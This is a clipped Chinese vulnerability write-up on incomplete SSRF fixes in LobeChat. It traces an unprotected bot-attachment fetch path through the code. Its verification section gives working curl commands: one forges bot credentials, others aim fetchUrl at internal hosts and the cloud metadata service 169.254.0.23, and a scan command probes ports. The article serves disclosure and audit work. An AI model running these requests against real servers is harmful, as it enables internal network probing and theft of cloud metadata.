---
title: 【先知】从修复 diff 到第五个洞：LobeChat SSRF 盲区审计
source: https://xz.aliyun.com/news/92685
source_host: xz.aliyun.com
clip_date: 2026-08-14T15:03:35+08:00
trace_id: 3c676e02-8cba-4429-a5df-e61a6bf1cde9
content_hash: d815f12087c02988311561cb72ae12e130ada4f45cff9cece90b4980661d5836
status: synced
tags:
  - 先知
  - 漏洞分析
  - SSRF
series: null
feed_source: 先知安全技术社区
ai_summary: LobeChat官方修复SSRF时漏掉botMessage附件下载路径，最新版仍可用伪造bot凭证触发内网请求和云metadata。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3bc75244-d011-81d7-99ff-d4e2fb79cc77
ioc:
  cves:
    - CVE-2026-58578
    - CVE-2026-58580
    - CVE-2026-59095
    - CVE-2026-59098
  cwes: []
  hashes:
    - 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> LobeChat官方修复SSRF时漏掉botMessage附件下载路径，最新版仍可用伪造bot凭证触发内网请求和云metadata。
> 
> - **漏洞背景：** 2026年7月2日LobeChat公开四个CVE（SSRF/BOLA/ReDoS/RAG），官方SSRF修复只覆盖agentSkills.importFromUrl和图片生成fetchImageFromUrl两个端点。
> - **受害路径：** bot平台（Discord/Slack/微信/飞书）sendAttachments.ts对attachment.fetchUrl裸fetch，无ssrfSafeFetch保护，v2.2.9至v2.2.14-canary.74全部受影响；telegram为透传不构成SSRF。
> - **利用条件：** OSS版权限中间件为空操作，普通注册用户即可创建agent和bot，botToken仅过三段式格式校验可伪造。
> - **实战验证：** 成功让服务器主动请求宿主机内网IP（172.25.0.1:9999）及腾讯云metadata（169.254.0.23）取回instance-id；盲SSRF无回显，需借助目标HTTP日志或debug日志files=1/0判断端口状态。
> - **审计工具：** 提供lobechat-audit.py，通过“入口-出口关联”从167处fetch调用收敛到4处高置信盲区，均为botMessage附件下载；建议将SSRF防护统一收口并加入CI自动化回归。

环境：Ubuntu 22.04 / Docker / lobehub/lobehub:v2.2.13（2026-08-01 发布）目标版本：v2.2.9（修复前）vs v2.2.13（最新稳定）vs v2.2.14-canary.74（8 月 12 日最新）

## 写在前面

2026 年 7 月 2 日，LobeChat 一口气公开了四个漏洞：CVE-2026-59095（SSRF，7.7 分）、CVE-2026-58580（BOLA，5.9 分）、CVE-2026-58578（ReDoS，6.5 分）、CVE-2026-59098（RAG 访问控制，6.5 分）。官方在同一天把四个修复 commit 合进了 canary 分支。

我把四个修复的 diff 全拉下来逐行看了一遍，注意到一个细节：SSRF 那个修复只覆盖了两个端点——agentSkills.importFromUrl 和生成图片时的 fetchImageFromUrl。但 LobeChat 的 bot 平台功能（Discord/Slack/微信/飞书机器人）里，有一堆地方会拿用户给的 URL 去发请求，官方一个都没碰。

这篇文章讲我怎么顺着这个线索找到第五个洞：botMessage 接口的附件下载路径，从 v2.2.9 到 8 月 12 日发布的 v2.2.14-canary.74，一直都是裸 fetch，没有任何 SSRF 防护。我在最新版上部署验证，伪造凭据创建 bot，成功让服务器主动请求了宿主机内网地址和腾讯云 metadata 服务。

文章的结构是：先讲四个已公开漏洞和官方的修法（另外三个修复我也逐个验证了是否完整），再讲 ssrfSafeFetch 防护机制本身，然后引出 botMessage 附件下载这条没人管的路径，接着是 OSS 版权限为什么拦不住普通用户，然后完整实战验证，最后总结成"修复完整性审计"这个方法论，附一个自动化审计工具。

核心发现： **官方修了 6 处同类型端点，漏了 4 处，漏掉的 4 处还是同一个入口（botMessage），最新版依然能打。**

## 一、四个洞和官方的修法

### 1.1 SSRF：CVE-2026-59095（7.7 分）

漏洞本身不复杂：两个 tRPC 端点会让服务器去 fetch 用户提供的 URL。NVD 对它的描述是 "allows authenticated attackers to direct internal HTTP requests to arbitrary URLs by supplying user-controlled... "——认证用户就能让服务器发内网请求。这个洞最初是以私有 advisory 提交的（GHSA-53h9-fmjf-frwr），7 月 2 日随修复一起公开。

第一个是 agentSkills.importFromUrl，用来从任意 URL 导入技能包。修复前的代码长这样：

```plain
// 修复前：直接 fetch 用户给的 URL
response = await fetch(input.url, { signal: controller.signal });
```

第二个是生成图片时对图片来源 URL 的抓取（fetchImageFromUrl），同一个问题。

官方的修复是给这两个端点套上项目里现成的 ssrfSafeFetch 封装：

```plain
// apps/server/src/services/skill/importer.ts（修复后）
response = await ssrfSafeFetch(input.url, { signal: controller.signal });
```

```plain
// apps/server/src/services/generation/index.ts（修复后）
const response = await ssrfSafeFetch(url, { headers: fetchHeaders });
```

PR 编号 #16601，7 月 2 日合并。我特意看了这个 PR 的 diff：改了 5 个文件，涉及 skill 导入、图片生成、web-crawler 的 naive 实现，改动量不大。就这些。

### 1.2 BOLA：CVE-2026-58580（5.9 分）

这是 MessageModel 的问题：5 个写方法——updateMessagePlugin、updatePluginState、updatePluginError、updateTTS、updateTranslate——在数据库查询时只按行 id 过滤，没带 userId 谓词。

后果：在多用户的 server-database 部署里，登录用户拿别人的消息 id 就能改对方的插件状态、TTS 配置、翻译内容。比如 updateTranslate，v2.2.9 里是这样：

```plain
// v2.2.9：query 带 translatesOwnership，但 INSERT 路径没有
updateTranslate = async (id: string, translate: Partial<ChatTranslate>) => {
  const result = await this.db.query.messageTranslates.findFirst({
    where: and(eq(messageTranslates.id, id), this.translatesOwnership()),
  });

  // 如果不存在，直接插入——这里没有归属校验
  if (!result) {
    return this.db.insert(messageTranslates).values({
      ...translate,
      id,
      userId: this.userId,
      workspaceId: this.workspaceId ?? null,
    });
  }
  ...
}
```

updateTranslate 的 INSERT 路径有个问题：id 是调用方传的，userId 却是当前用户。如果攻击者知道别人的 message id，往 messageTranslates 表插一行，把别人的消息 id 关联上自己的翻译内容——别人看到自己的消息翻译被篡改了。而 UPDATE 路径带 translatesOwnership() 只挡了已存在的行，挡不住"插入伪造关联"。

官方修复是在 router 层统一补了资源归属校验：

```plain
// canary 修复后：先校验消息归属
updateTTS: messageProcedure
  .use(withScopedPermission('message:update'))
  .mutation(async ({ input, ctx }) => {
    await assertCanUseMessageTargets(guardCtx(ctx), [input.id]);
    ...
  }),
```

我验证了这个修复的完整性：把 message router 里全部 23 个写方法过了一遍，每个都有对应的资源断言，没有漏网的。这个洞修得干净，只能当对照组。

### 1.3 ReDoS：CVE-2026-58578（6.5 分）

GitHub 技能导入功能有个正则问题。https://github.com/owner/repo/tree/branch/<path> 里的 path 段被直接拼进正则：

```plain
// 修复前：用户输入直接进正则
const basePathPattern = new RegExp(
  `^[^/]+/${basePath.replaceAll(/^\/|\/$/g, '')}/SKILL\\.md$`,
);
```

basePath 来自 https://github.com/owner/repo/tree/branch/<path> 的 path 段，完全用户可控。构造 (a+)+ 之类的模式就能让正则灾难性回溯，卡死 Node.js 事件循环；构造 \[invalid 直接抛 SyntaxError。

basePath 拼接前经过了 replaceAll(/^\\/|\\/$/g, '')，只去掉了首尾斜杠。也就是说，攻击者传 https://github.com/o/r/tree/b/(a+)+$ 这种，basePath 变成 (a+)+$，正则就变成 ^\[^/\]+/(a+)+$/SKILL\\.md$——(a+)+ 配合超长的输入字符串（GitHub zip 包里的路径）就会指数级回溯。

官方修法是把正则改成纯字符串匹配：

```plain
// 修复后：不用正则了
const normalizedBasePath = basePath.replaceAll(/^\/|\/$/g, '');
const suffix = `/${normalizedBasePath}/SKILL.md`;
const matchWithBasePath = allPaths.find((path) => path.endsWith(suffix));
```

这个修复我也确认过，是完整的。从修法看，就是把正则匹配换成了字符串匹配，能用字符串解决的就别用正则。

### 1.4 RAG 访问控制：CVE-2026-59098（6.5 分）

KnowledgeBaseSearchService 做语义搜索时，knowledgeBaseFiles 的查询只按 knowledgeBaseId 过滤，没带 workspace 谓词。攻击者拿别人的 knowledgeBaseId 就能解析出对方的 fileIds，再结合语义搜索接口把文件内容搜出来。

```plain
// 修复前：没带 workspace 过滤
const knowledgeFiles = await this.serverDB.query.knowledgeBaseFiles.findMany({
  where: inArray(knowledgeBaseFiles.knowledgeBaseId, knowledgeIds),
});

// 修复后：加了 buildWorkspaceWhere
const knowledgeFiles = await this.serverDB.query.knowledgeBaseFiles.findMany({
  where: and(
    inArray(knowledgeBaseFiles.knowledgeBaseId, knowledgeIds),
    buildWorkspaceWhere(
      { userId: this.userId, workspaceId: this.workspaceId },
      knowledgeBaseFiles,
    ),
  ),
});
```

两条分支（vector 搜索和 BM25 搜索）我都跑了一遍源码，都带 workspace 过滤。这条也修干净了。

### 1.5 四个修复看完，一个共性

四个洞的修法各有各的套路：SSRF 是给调用点套防护，BOLA 是 router 层补资源断言，ReDoS 是正则改字符串匹配，RAG 是加 workspace 谓词。但有个共性： **除了 SSRF，另外三个修复都覆盖了所有同类位置**——BOLA 的 23 个写方法、ReDoS 的 findSkillMd、RAG 的两条搜索分支，我都逐个确认过，没有漏网的。

拿 BOLA 修复举例：assertCanUseMessageTargets 只在 workspace 模式下生效，个人模式（没有 workspaceId）直接 return。个人模式靠 model 层的 buildWorkspaceWhere 兜底——个人数据本来就是 userId + workspace_id IS NULL 过滤的，所以这条路是安全的。这个分层我没觉得有问题。

只有 SSRF 那个修复，覆盖范围明显偏小：两个端点，改完就完。当时我就想，是不是还有其他 fetch 用户 URL 的地方没被看到。这个念头直接引出后面的第五个洞。

## 二、官方防护 ssrfSafeFetch 长什么样

在讲第五个洞之前，得先搞清楚官方的防护机制本身。ssrfSafeFetch 在 packages/ssrf-safe-fetch/index.ts，核心实现不长：

```plain
export const ssrfSafeFetch = async (
  url: string,
  options?: RequestInit,
  ssrfOptions?: SSRFOptions,
): Promise<Response> => {
  // 环境变量开关：SSRF_ALLOW_PRIVATE_IP_ADDRESS=1 会放行私网
  const envAllowPrivate = process.env.SSRF_ALLOW_PRIVATE_IP_ADDRESS === '1';
  const allowPrivate = ssrfOptions?.allowPrivateIPAddress ?? envAllowPrivate;

  const agentOptions: RequestFilteringAgentOptions = {
    allowIPAddressList: ssrfOptions?.allowIPAddressList ??
      process.env.SSRF_ALLOW_IP_ADDRESS_LIST?.split(',').filter(Boolean) ?? [],
    allowMetaIPAddress: allowPrivate,
    allowPrivateIPAddress: allowPrivate,
    denyIPAddressList: [],
  };

  // 用 request-filtering-agent 的 agent 拦截私网连接
  const httpAgent = new RequestFilteringHttpAgent(agentOptions);
  const httpsAgent = new RequestFilteringHttpsAgent(agentOptions);

  const response = await fetch(url, {
    ...options,
    agent: (parsedURL: URL) => (parsedURL.protocol === 'https:' ? httpsAgent : httpAgent),
  } as any);
  ...
};
```

原理是 request-filtering-agent：在 TCP 连接建立前解析 DNS，如果目标 IP 落在私网段（10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8、169.254.0.0/16 这些）就拒绝连接。而且 agent 是每个重定向跳都会调用的，所以 302 跳到内网也会被拦。

防护本身没毛病，问题在于： **它只被用在官方修的那两个端点上**。项目里 fetch 用户可控 URL 的地方远不止两个，而"没套 ssrfSafeFetch 的地方"就是裸奔。

这个封装的测试覆盖其实挺全的——私网 IP、云 metadata、file:// 协议、环境变量开关、响应体大小限制都有单测。防护能力是到位的，缺的是调用点覆盖。

另外，这个封装还支持通过环境变量放行特定 IP：

```plain
# 允许特定内网 IP（保持其他私网拦截）
SSRF_ALLOW_IP_ADDRESS_LIST=192.168.1.100,10.0.0.50
# 完全放行私网（不推荐，仅调试用）
SSRF_ALLOW_PRIVATE_IP_ADDRESS=1
```

这些都是合理的设计。但对 botMessage 的裸 fetch 来说，这些开关一个都管不到——它压根不走 ssrfSafeFetch。

## 三、botMessage 附件下载：一条没人管的路径

### 3.1 从入口到出口的完整链路

我在全仓库搜裸 fetch 调用，结果 bot 平台四个 sendAttachments.ts 全是裸 fetch：

```plain
grep -n "fetch(attachment.fetchUrl" apps/server/src/services/bot/platforms/discord/sendAttachments.ts
# 33: const response = await fetch(attachment.fetchUrl, {
```

四个平台（Discord/Slack/微信/飞书）的 sendAttachments.ts 代码几乎一样：

```plain
// apps/server/src/services/bot/platforms/discord/sendAttachments.ts
const loadAttachmentBuffer = async (
  attachment: BotMessageAttachment,
): Promise<Buffer | undefined> => {
  if (attachment.data) {
    // 优先 base64
    return Buffer.from(attachment.data, 'base64');
  }
  if (attachment.fetchUrl) {
    try {
      // 这里！用户给的 URL 直接 fetch
      const response = await fetch(attachment.fetchUrl, {
        signal: AbortSignal.timeout(15_000),
      });
      if (response.ok) {
        return Buffer.from(await response.arrayBuffer());
      }
    } catch (error) {
      log('loadAttachmentBuffer: fetch failed for %s: %O', attachment.fetchUrl, error);
    }
  }
  return undefined;
};
```

attachment.fetchUrl 从哪来？往上追，是 tRPC 接口 botMessage.sendMessage / sendDirectMessage 的输入：

```plain
// apps/server/src/routers/lambda/botMessage.ts
const attachmentsInputSchema = z.array(
  z.object({
    data: z.string().optional(),
    fetchUrl: z.string().url().optional(),
    mimeType: z.string().optional(),
    name: z.string().optional(),
    type: z.enum(['image', 'file', 'video', 'audio']),
  }),
);
```

z.string().url() 只校验 URL 格式合法，不校验是不是内网地址。 [http://169.254.0.23/latest/meta-data/](http://169.254.0.23/latest/meta-data/) 是合法 URL， [http://172.25.0.1:9999/](http://172.25.0.1:9999/) 也是。

我拉了一份 v2.2.9（修复前）的 sendAttachments.ts 对比，两个版本的这段代码一模一样：

```plain
// v2.2.9 和 v2.2.13 完全一致：都是裸 fetch
if (attachment.fetchUrl) {
  const response = await fetch(attachment.fetchUrl, {
    signal: AbortSignal.timeout(15_000),
  });
  if (response.ok) {
    return Buffer.from(await response.arrayBuffer());
  }
  ...
}
```

官方修 SSRF 的时候根本没碰 bot 消息这块——不是修坏了，是压根没看这条路径。

完整链路是：

```plain
botMessage.sendMessage（tRPC 入口，用户可控 fetchUrl）
  → service.sendMessage（平台分发）
    → postToChannel
      → materializeAttachmentsForDiscord
        → loadAttachmentBuffer
          → fetch(attachment.fetchUrl)  ← 裸 fetch，无任何 SSRF 防护
```

### 3.2 官方为什么没修到这条

官方修 SSRF 时，修复 PR 覆盖的是 skill 导入和图片生成两条业务线。bot 平台功能是另一套代码路径——botMessage router + 各平台的 sendAttachments。从 commit 历史看，这两块代码是不同时期、不同负责人维护的，修 SSRF 的人大概率没意识到 bot 附件 fetchUrl 也是用户可控的 URL。

这其实是个老问题：ssrfSafeFetch 封装早就存在了，但项目里每个 fetch 用户 URL 的地方都得记得手动套它，漏一个就是漏洞。

### 3.3 全量盘点：受保护 vs 裸奔

为了确认官方到底覆盖了多少、漏了多少，我把项目里所有 fetch 用户可控 URL 的调用点都列了出来。第一版是用 grep 粗暴搜的，结果一大堆，里面混着爬虫、图片处理、文件上传这些不相干的。我按"URL 来源是不是用户输入"筛了一遍，最后剩 11 处，整理成下面这张表：

|     |     |     |
| --- | --- | --- |  
| **调用点** | **URL 来源** | **防护** |
| skill/importer.ts importFromUrl | 用户输入 | ssrfSafeFetch ✓ |
| generation/index.ts fetchImageFromUrl | 用户输入 | ssrfSafeFetch ✓ |
| web-crawler naive.ts | 爬虫 URL | ssrfSafeFetch ✓ |
| utils/imageToBase64.ts | 图片 URL | ssrfSafeFetch ✓ |
| utils/videoToBase64.ts | 视频 URL | ssrfSafeFetch ✓ |
| model-runtime uriParser.ts | 图片 URL 校验 | ssrfSafeFetch ✓ |
| **discord/sendAttachments.ts** | **用户输入 fetchUrl** | **裸 fetch ✗** |
| **slack/sendAttachments.ts** | **用户输入 fetchUrl** | **裸 fetch ✗** |
| **wechat/sendAttachments.ts** | **用户输入 fetchUrl** | **裸 fetch ✗** |
| **feishu/sendAttachments.ts** | **用户输入 fetchUrl** | **裸 fetch ✗** |
| file/index.ts uploadFromUrl | 外部 URL | 裸 fetch（无调用链） |

前 6 个是官方 SSRF 修复 PR 覆盖或早已受保护的，后 5 个是裸奔。其中 4 个 sendAttachments 都挂在 botMessage 接口下、用户可直接触发，uploadFromUrl 目前没有发现可达的调用链（代码存在但没人调，属于潜在风险）。

这个表是文章最核心的"修复完整性"证据：官方修了 6 处，漏了 4 处同类型，还都是同一个入口。

### 3.4 等等，telegram 呢？

四个平台里我列了 Discord/Slack/微信/飞书，没列 telegram——不是漏了，是 telegram 的实现不同。看 telegram 的 sendAttachments：

```plain
// apps/server/src/services/bot/platforms/telegram/sendAttachments.ts
const resolveTelegramSource = (att, index) => {
  if (att.fetchUrl) {
    return { url: att.fetchUrl };  // 直接把 URL 透传给 Telegram API
  }
  ...
};
```

telegram 平台收到 fetchUrl 后 **不自己下载**，而是把 URL 原样塞进 Telegram API 的请求里，让 Telegram 官方服务器去拉取。所以对 LobeChat 服务器本身不构成 SSRF（请求不是它发出的）。这是"转发型"和"代理型"的区别：Discord/Slack/微信/飞书是服务器自己 fetch（代理型，有 SSRF），telegram 是透传给第三方（转发型，无 SSRF）。

这个区别也说明审计器不能全自动出结论：工具标出可疑点，但每个点的最终定性要靠读代码判断是代理还是转发。

## 四、OSS 版权限全是空操作

光有裸 fetch 还不够，得确认一个普通注册用户能不能调到这个接口。看 botMessage router 的权限中间件：

```plain
// packages/business-server/src/trpc-middlewares/rbacPermission.ts
export const withScopedPermission = (_action: string) =>
  trpc.middleware(async (opts) => opts.next());

export const withRbacPermission = (_code: string) =>
  trpc.middleware(async (opts) => opts.next());

export const withAnyRbacPermission = (_codes: string[]) =>
  trpc.middleware(async (opts) => opts.next());

export const withAllRbacPermissions = (_codes: string[]) =>
  trpc.middleware(async (opts) => opts.next());
```

这个文件的顶部注释写得很明白：

```plain
No-op stub for OSS builds. Cloud overrides this entire module via tsconfig
path priority and provides the real workspace-RBAC-aware implementations.
In OSS there is no workspace concept worth gating, so every gate passes through.
```

翻译一下：开源版里这些权限检查全是空操作，直接放行；云端版通过 tsconfig 的路径优先级把整个模块替换成真实实现。LobeChat 的 tsconfig 里配了路径映射：

"@/business/server/\*": \["./packages/business-server/src/\*", "./src/business/server/\*"\]

第一个路径是 OSS 的 stub，第二个是 cloud 的私有实现（不随开源仓库发布）。自部署的 OSS 版只会命中第一个，也就是空操作。

bot 相关的 featureAccess 也一样：

```plain
// src/business/server/bot/featureAccess.ts
export async function isBotFeatureAccessAllowed(_params): Promise<boolean> {
  return true;
}
export async function assertBotFeatureAccess(params): Promise<void> {
  if (await isBotFeatureAccessAllowed(params)) return;
  ...
}
```

结论： **在自部署（server-database 模式）的 OSS 版里，注册一个账号就能调 sendMessage**，权限链路全是通的。

### 4.1 那 bot 归属校验呢？

有人可能会问：sendMessage 要传 botId，bot 是用户自己的资源，能不能用别人的 bot？看 AgentBotProviderModel.findById：

```plain
// packages/database/src/models/agentBotProvider.ts
findById = async (id: string) => {
  const [result] = await this.db
    .select()
    .from(agentBotProviders)
    .where(and(eq(agentBotProviders.id, id), this.ownership()))
    .limit(1);
  ...
};
```

ownership() 会带上 userId 条件，所以只能用 **自己创建** 的 bot。这个设计是对的——但它拦不住攻击者：攻击者自己注册账号、自己建 bot，凭证伪造就能过格式校验，然后拿自己的 botId 调 sendMessage。归属校验拦的是"用别人的 bot"，不是"用自己的 bot 干坏事"。

这条链路上，权限中间件是空操作（OSS），bot 凭证只验格式不验真伪，fetchUrl 只验格式不验地址。三个环节单独看都不算漏洞，串起来就是一个完整的 SSRF。

## 五、实战验证

### 5.1 部署，踩了三个坑

腾讯云轻量服务器（2核4G Ubuntu 22.04），Docker 部署，server-database 模式（PostgreSQL + Redis + MinIO）。部署过程踩了三个坑：

第一个坑：镜像名。官方仓库已经从 lobehub/lobe-chat 改名为 lobehub/lobehub，docker pull lobehub/lobe-chat:latest 拿到的是 1.143.3 旧版（2026 年 1 月的），跑起来报 Auth.js 的 UnknownAction 错误。当时我以为是数据库配置的问题，查了半天环境变量，最后发现是镜像版本不对——1.x 和 2.x 的认证体系整个换了。换 lobehub/lobehub:latest 才是 v2.2.13。

第二个坑：PostgreSQL 扩展。LobeChat 的迁移脚本要 CREATE EXTENSION vector 和 pg_search，普通 postgres 镜像没有这两个扩展，迁移直接失败。得用 paradedb/paradedb:pg16 这个带 pg_search 的镜像。

第三个坑：KEY_VAULTS_SECRET。用来加密数据库里的用户密钥，必须是 16/24/32 字节的 base64。我一开始写了个 37 字节的，一调要动密钥的接口（比如 aiModel.batchToggleAiModels）就直接报错。用 openssl rand -base64 32 重新生成才行。

完整 compose 文件长这样（关键环境变量）：

```plain
services:
  postgres:
    image: paradedb/paradedb:pg16
    environment:
      POSTGRES_DB: lobechat
      POSTGRES_USER: lobechat
      POSTGRES_PASSWORD: lobechat_secret
  lobe-chat:
    image: lobehub/lobehub:latest
    environment:
      - DATABASE_URL=postgres://lobechat:lobechat_secret@postgres:5432/lobechat
      - REDIS_URL=redis://redis:6379
      - KEY_VAULTS_SECRET=<openssl rand -base64 32>
      - AUTH_SECRET=<openssl rand -base64 32>
      - AUTH_EMAIL_VERIFICATION=0
      - SSRF_ALLOW_PRIVATE_IP_ADDRESS=0
```

部署用的 compose 里有个环境变量，当时没在意，后来才反应过来它的作用：

\- SSRF_ALLOW_PRIVATE_IP_ADDRESS=0

这是 ssrfSafeFetch 的开关，默认 0（拦截私网）。翻译过来就是 **官方防护默认开着**——但只对套了 ssrfSafeFetch 的那 6 个端点生效。botMessage 的裸 fetch 根本不走这个开关，所以这个环境变量对第五个洞没有任何作用。默认开着防护，不等于所有请求都受防护，这个区别我后来才意识到。

### 5.2 注册、建 agent、伪造 bot 凭证

先注册用户 zack：

```plain
curl -X POST http://127.0.0.1:3210/api/auth/sign-up/email \
  -H 'Content-Type: application/json' \
  -d '{"name":"zack","email":"zack@test.com","password":"Test@123456"}'
```

返回的 JSON 里带 session token 和用户信息：

```plain
{
  "token": "qJKM0rFmxtKTeByvvOiZniAIge2PQ5ez.GtzYFFU9v4Lh7pJdp5Ec9",
  "user": {
    "name": "zack",
    "email": "zack@test.com",
    "emailVerified": false,
    "id": "user_ye05po32B0LbaZ5zZVfCX0G8IHM"
  }
}
```

注意 emailVerified 是 false——注册不需要验证邮箱就能拿到完整会话。登录也是同一个接口体系，session cookie 有效期 7 天。后面所有 tRPC 请求都靠它认证：

```plain
curl -X POST http://127.0.0.1:3210/trpc/lambda/agent.createAgent \
  -H 'Cookie: better-auth.session_token=...' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"title":"zack-agent"}}'
# 返回 {"agentId":"agt_14AmVANET91Q"}
```

创建 bot 是关键一步。agentBotProvider.create 要填 Discord 的 applicationId、publicKey、botToken，但这些只过 **格式校验**——botToken 的正则是三段式：

^\[\\w-\]{20,}\\.\[\\w-\]{5,}\\.\[\\w-\]{20,}$

我随便编了一段满足格式的假 token 就通过了：

```plain
curl -X POST http://127.0.0.1:3210/trpc/lambda/agentBotProvider.create \
  -H 'Cookie: better-auth.session_token=...' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"agentId":"agt_14AmVANET91Q","applicationId":"222333444555666777","platform":"discord","credentials":{"publicKey":"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef","botToken":"MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5.deadbeefcafe.0123456789abcdef0123456789abcdef0123456789abcdef"}}}'
# 返回 botId: 77a0bac4-a395-4829-a16b-26c71f830583
```

不需要真实 Discord bot token。校验只查格式，不验证真伪。这是一个低成本的前提条件：注册账号 + 3 个 curl 就能拿到一个可用的 bot。

### 5.3 触发 SSRF

在宿主机上起一个 HTTP 服务做探测（监听 9999 端口），然后调 sendMessage：

```plain
curl -X POST http://127.0.0.1:3210/trpc/lambda/botMessage.sendMessage \
  -H 'Cookie: better-auth.session_token=...' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"botId":"77a0bac4-a395-4829-a16b-26c71f830583","channelId":"111111111111111111","content":"test","attachments":[{"type":"file","name":"a.txt","mimeType":"text/plain","fetchUrl":"http://172.25.0.1:9999/"}]}}'
```

LobeChat 容器（172.25.0.5）的请求打到了宿主机（172.25.0.1）的 9999 端口，HTTP 服务日志里能看到：

172.25.0.5 - - \[13/Aug/2026 09:23:20\] "GET / HTTP/1.1" 200 -

**服务器主动请求了内网地址，实锤。**

### 5.4 盲打特性：端口探测的观测方式

我一开始以为开放端口和关闭端口的响应会有差异，实测发现没有： **两种情况的 tRPC 响应完全一样**。

关闭端口时，loadAttachmentBuffer 里的 fetch 抛错，被 try/catch 静默吞掉，函数返回 undefined。然后代码照样走 Discord 上传流程——反正 bot token 是假的，最终 tRPC 报错永远是 discord.com 连接超时：

{"error":{"json":{"message":"Connect Timeout Error (attempted address: discord.com:443, timeout: 10000ms)",...}}}

反正， **tRPC 响应看不出端口状态**。这个 SSRF 是盲打。判定端口是否可达要靠外部观测点：

1.  攻击者控制的内网 HTTP 服务（观察访问日志）
2.  服务器上 LobeChat 的 debug 日志（DEBUG=bot-platform:\*）

开了 debug 日志后，开放端口 vs 关闭端口的差异非常清楚（grep 实际匹配到的是 materializeAttachmentsForDiscord 和 createMessage 两条日志）：

```plain
# 9999 开放
bot-platform:discord:client createMessage: channel=111111111111111111, files=1

# 5555 关闭
bot-platform:discord:send-attachments materializeAttachmentsForDiscord: skipping attachment "a.txt"
bot-platform:discord:client createMessage: channel=111111111111111111, files=0
```

files=1 表示附件字节成功下载（fetch 成功），files=0 表示下载失败。用这个特征就能对内网做端口扫描：遍历 IP:端口，看 files 是 1 还是 0。

我还把宿主机另一个内网 IP（10.1.0.3）的 9999 端口也加进了 scan 目标（5.6 的 scan 输出里能看到），同样能打到。

这个"盲打"特性本身也是判断漏洞真实性的证据：fetch 失败被静默吞掉是代码里 try/catch 的真实行为，不是测试环境恰好超时。攻击者在内网放一个自己能看的 HTTP 服务，配合 sendMessage 就能扫出内网哪些端口活着。

### 5.5 打云 metadata

腾讯云的 metadata 服务地址是 169.254.0.23（不是 AWS 的 169.254.169.254）。先确认容器网络能直连：

```plain
docker exec lobechat-app node -e "fetch('http://169.254.0.23/latest/meta-data/instance-id').then(r=>r.text()).then(console.log)"
# 输出: ins-2axv5mea
```

然后把这个地址塞进 fetchUrl 触发 SSRF：

```plain
curl -X POST http://127.0.0.1:3210/trpc/lambda/botMessage.sendMessage \
  -H 'Cookie: better-auth.session_token=...' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"botId":"77a0bac4-a395-4829-a16b-26c71f830583","channelId":"111111111111111111","content":"t","attachments":[{"type":"file","name":"meta.txt","mimeType":"text/plain","fetchUrl":"http://169.254.0.23/latest/meta-data/instance-id"}]}}'
```

debug 日志显示：

bot-platform:discord:client createMessage: channel=..., files=1

files=1 说明 metadata 返回的 instance-id 内容被服务器成功下载、作为附件进入了上传流程。SSRF 到云 metadata 这条链是通的——不只是探测端口，而是真的能取回内容（盲打状态下内容不回流，但字节确实拿到了）。

### 5.6 用审计工具跑一遍完整链路

上面所有手动验证的步骤，我封装进了 lobechat-audit.py。用 scan 子命令对内网三个目标做探测：

```plain
python3 lobechat-audit.py scan \
  --url http://127.0.0.1:3210 \
  --cookie 'better-auth.session_token=...' \
  --bot-id 77a0bac4-a395-4829-a16b-26c71f830583 \
  --targets '172.25.0.1:9999,172.25.0.1:5555,10.1.0.3:9999'
```

输出：

```plain
[*] 172.25.0.1:9999              SSRF request sent (observe target log for confirmation)
[*] 172.25.0.1:5555              SSRF request sent (observe target log for confirmation)
[*] 10.1.0.3:9999                SSRF request sent (observe target log for confirmation)

[!] 盲 SSRF: tRPC 响应无差异 (fetch 失败被静默吞掉)。
    判定端口状态需外部观测: 目标 HTTP 日志, 或服务器 DEBUG=bot-platform:* 日志
    (files=1 开放 / files=0 关闭)。
[+] 0/3 targets OPEN
```

三个目标都发出了 SSRF 请求，配合宿主机 9999 端口的 HTTP 日志，能确认哪些端口可达。工具不会假装能从响应判断端口状态——盲打就是盲打，提示写得明明白白。

### 5.7 攻击链完整串起来

到这里，整条攻击链是：

```plain
注册账号（无需邮箱验证）
  → 创建 agent（一个 curl）
  → 创建 bot（伪造 Discord 凭据，只过格式校验）
  → 调 sendMessage 传 fetchUrl=http://<内网地址>
  → 服务器用容器网络发起请求
  → 可达内网任意 IP:端口 / 云 metadata
```

每一步都是普通登录用户的权限，没有任何提权动作。攻击者不需要真实 Discord 账号，不需要服务器上的任何凭据，注册一个邮箱就能打。

## 六、为什么官方会漏掉这条

四个洞都是 7 月 2 日公开的。SSRF 修复 PR #16601 在 7 月 2 日合并，只覆盖了 skill 导入和图片生成两个端点。bot 平台功能是另一套代码路径，负责修复的人可能根本没意识到附件 fetchUrl 也是用户可控的 URL。

我写这篇文章的时候（8 月 12 日）又拉了一次最新版确认：v2.2.14-canary.74（8 月 12 日发布）里，四个平台的 sendAttachments.ts 依然全部是裸 fetch，botMessage.ts 的 fetchUrl 输入 schema 原样保留。从 7 月初修复到现在，一个多月、四个版本迭代，这条路径始终没人碰过。

完整的时间线是这样的：

```plain
2026-06-04  攻击者私信提交 SSRF（GHSA-53h9-fmjf-frwr，私有披露）
2026-07-01  ReDoS 修复（#16548）、RAG 修复（#16594）合入
2026-07-02  SSRF 修复（#16601）合入；四个 CVE 同一天公开
2026-08-01  v2.2.13 稳定版发布（我部署验证的版本，依旧裸 fetch）
2026-08-12  v2.2.14-canary.74 发布（我复核的版本，依旧裸 fetch）
```

注意 SSRF 这条：6 月 4 日私有披露，7 月 2 日才修复公开，中间近一个月。而修复只覆盖了两个端点——如果这一个月里有人认真做一次"全量 fetch 调用点审计"，botMessage 这条路径早就该被发现。但它没有。

更深层的原因：SSRF 防护是"按调用点打补丁"而不是"统一收口"。ssrfSafeFetch 这个封装存在，但每个 fetch 用户 URL 的地方都得手动套它。人工检查漏一个就是漏洞，而且这种漏洞不跑全量扫描很难发现——因为代码看起来"只是下载个附件"。

## 七、方法论：修复完整性审计器

### 7.1 思路

